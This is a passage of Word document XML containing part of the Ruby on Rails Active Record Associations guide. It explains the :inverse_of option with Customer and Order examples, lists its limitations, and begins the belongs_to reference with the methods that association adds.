                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10C156FF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :orders</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64333DFD" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1CDE0C72" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D903CB8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Order &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7176275F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :customer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5CD1611E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5C28900C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>By default, Active Record doesn’t know about the connection between these associations. This can lead to two copies of an object getting out of sync:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5976"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="1FFF153B" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1B2B1239" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>c = Customer.first</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E66E3D4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>o = c.orders.first</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C3F3507" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>c.first_name == o.customer.first_name # =&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0FE20E6F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>c.first_name = 'Manny'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E507756" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>c.first_name == o.customer.first_name # =&gt; false</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="17DE3CFF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This happens because c and o.customer are two different in-memory representations of the same data, and neither one is automatically refreshed from changes to the other. Active Record provides the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:inverse_of</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option so that you can inform it of these relations:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5904"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="16DAF412" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="43D6BDD5" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="203D5AE4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  </w:t>
            </w:r>
            <w:r w:rsidRPr="00074E0C">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>has_many :orders, :inverse_of</w:t>
            </w:r>
            <w:r w:rsidRPr="00074E0C">
              <w:rPr>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00074E0C">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; :customer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6CD48D61" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3140B70D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1ABB4E75" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Order &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1EBDA517" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  </w:t>
            </w:r>
            <w:r w:rsidRPr="00074E0C">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>belongs_to :customer, :inverse_of</w:t>
            </w:r>
            <w:r w:rsidRPr="00074E0C">
              <w:rPr>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00074E0C">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; :orders</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C731AE0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="68D21135" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>With these changes, Active Record will only load one copy of the customer object, preventing inconsistencies and making your application more efficient:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5856"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="1C555177" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5DEB00B5" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>c = Customer.first</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B871385" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>o = c.orders.first</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2804A125" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>c.first_name == o.customer.first_name # =&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54A6DB63" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>c.first_name = 'Manny'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="203B41BA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>c.first_name == o.customer.first_name # =&gt; true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1023145B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">There are a few limitations to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>inverse_of</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> support:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CD09D88" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="44"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">They do not work with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:through</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> associations.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A384644" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="44"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">They do not work with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:polymorphic</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> associations.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BEC9311" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="44"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">They do not work with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:as</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> associations.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DD2D062" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="44"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> associations, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> inverse associations are ignored.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B913E4F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>4 Detailed Association Reference</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E10162C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The following sections give the details of each type of association, including the methods that they add and the options that you can use when declaring an association.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A2F55AD" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Association Reference</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44F69075" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association creates a one-to-one match with another model. In database terms, this association says that this class contains the foreign key. If the other class contains the foreign key, then you should use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_one</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> instead.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4210C4B3" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.1.1 Methods Added by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1856EBF5" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When you declare a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association, the declaring class automatically gains four methods related to the association:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59A6E32E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>(force_reload = false)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="726638FE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>=(associate)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56A56DF2" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>build_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>(attributes = {})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2377B88E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>create_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>(attributes = {})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42EFD8AE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In all of these methods, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is replaced with the symbol passed as the first argument to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r>
        <w:t>. For example, given the declaration:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3984"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="1F2A2770" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="065874CA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Order &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A851A3D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :customer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F4C5A1F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2F37B4CD" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Each instance of the order model will have these methods:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2016"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="33E9DF9A" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="071FF065" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>customer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F5616F3" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>customer=</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54BB5453" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>build_customer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="319ECB4C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>create_customer</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2E33EB3E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When initializing a new </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_one</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association you must use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>build_</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> prefix to build the association, rather than the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>association.build</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method that would be used for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_and_belongs_to_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> associations. To create one, use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>create_</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> prefix.</w:t>
      </w:r>
    </w:p>
